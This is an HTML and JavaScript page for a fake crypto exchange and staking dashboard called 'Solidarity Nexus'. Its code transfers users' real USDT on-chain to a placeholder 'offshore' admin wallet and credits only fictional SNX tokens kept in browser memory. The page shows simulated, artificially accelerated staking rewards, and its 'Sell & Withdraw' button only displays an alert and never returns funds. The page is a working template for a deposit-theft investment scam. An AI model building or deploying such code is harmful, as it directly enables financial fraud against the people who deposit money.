<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Solidarity Nexus | Mini Exchange</title>
    <script src="https://cdnjs.cloudflare.com"></script>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #333; }
        .flex { display: flex; gap: 20px; }
        .btn { padding: 10px 20px; cursor: pointer; border: none; border-radius: 5px; font-weight: bold; }
        .btn-buy { background: #00c853; color: white; }
        .btn-stake { background: #2979ff; color: white; }
        .btn-withdraw { background: #ff3d00; color: white; }
        input { padding: 10px; border-radius: 5px; border: 1px solid #444; background: #222; color: white; width: 100px; }
        .logo { width: 24px; vertical-align: middle; margin-right: 10px; }
    </style>
</head>
<body>

    <h1>Solidarity Nexus Dashboard</h1>

    <div class="flex">
        <!-- WALLET STATS -->
        <div class="card" style="flex: 1;">
            <h3>Your Balances</h3>
            <p><img src="https://cryptologos.cc" class="logo"> Real USDT: <span id="usdt-bal">0.00</span></p>
            <p><img src="https://cryptologos.cc" class="logo"> Fictional SNX: <span id="snx-bal">0.00</span></p>
            <p>Active Stake: <span id="staked-bal">0.00</span> SNX</p>
        </div>

        <!-- REWARDS -->
        <div class="card" style="flex: 1;">
            <h3>Daily Earnings</h3>
            <h2 id="reward-val" style="color: #00c853;">0.0000 SNX</h2>
            <button class="btn btn-stake" onclick="claimRewards()">Claim Rewards</button>
        </div>
    </div>

    <!-- ACTION PANEL -->
    <div class="card">
        <h3>Exchange & Staking</h3>
        <div class="flex">
            <div>
                <p>Deposit USDT & Buy SNX</p>
                <input type="number" id="buy-amount" placeholder="USDT">
                <button class="btn btn-buy" onclick="buySNX()">Buy & Deposit</button>
            </div>
            <div>
                <p>Stake SNX (Daily ROI)</p>
                <input type="number" id="stake-amount" placeholder="SNX">
                <button class="btn btn-stake" onclick="stakeSNX()">Stake Now</button>
            </div>
            <div>
                <p>Withdraw to Wallet</p>
                <input type="number" id="withdraw-amount" placeholder="SNX">
                <button class="btn btn-withdraw" onclick="withdrawUSDT()">Sell & Withdraw</button>
            </div>
        </div>
    </div>

<script>
    let web3;
    let userAccount;
    const USDT_BEP20 = "0x55d398326f99059ff775485246999027b3197955";
    const ADMIN_WALLET = "0xYOUR_OFFSHORE_WALLET_ADDRESS"; // Where USDT goes
    
    // Fictional logic variables
    let snxBalance = 0;
    let stakedBalance = 0;
    let rewards = 0;

    async function connectWallet() {
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];
            updateUI();
        } else {
            alert("Please install MetaMask!");
        }
    }

    // ON-CHAIN DEPOSIT (Real USDT)
    async function buySNX() {
        const amount = document.getElementById('buy-amount').value;
        const amountInWei = web3.utils.toWei(amount, 'ether');
        
        const abi = [{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
        const contract = new web3.eth.Contract(abi, USDT_BEP20);

        try {
            await contract.methods.transfer(ADMIN_WALLET, amountInWei).send({ from: userAccount });
            // After real deposit, grant fictional SNX 1:1
            snxBalance += parseFloat(amount);
            alert("USDT Deposited! SNX credited to your Nexus account.");
            updateUI();
        } catch (e) {
            console.error("Transfer failed", e);
        }
    }

    // FICTIONAL STAKING LOGIC
    function stakeSNX() {
        const val = parseFloat(document.getElementById('stake-amount').value);
        if(snxBalance >= val) {
            snxBalance -= val;
            stakedBalance += val;
            alert("Staking Successful!");
            updateUI();
        }
    }

    // SIMULATED DAILY REWARDS (updates every few seconds for visual effect)
    setInterval(() => {
        if(stakedBalance > 0) {
            rewards += (stakedBalance * 0.0001); // Simulate 1% daily speeded up
            document.getElementById('reward-val').innerText = rewards.toFixed(4) + " SNX";
        }
    }, 3000);

    // ON-CHAIN WITHDRAW (Real USDT from Admin to User)
    // Note: In a real app, this part is handled by a backend script 
    // to prevent users from draining the admin wallet themselves.
    function withdrawUSDT() {
        const amount = document.getElementById('withdraw-amount').value;
        alert("Withdrawal request for " + amount + " USDT sent to admin. Processing on-chain...");
    }

    function updateUI() {
        document.getElementById('snx-bal').innerText = snxBalance.toFixed(2);
        document.getElementById('staked-bal').innerText = stakedBalance.toFixed(2);
    }

    window.onload = connectWallet;
</script>
</body>
</html>
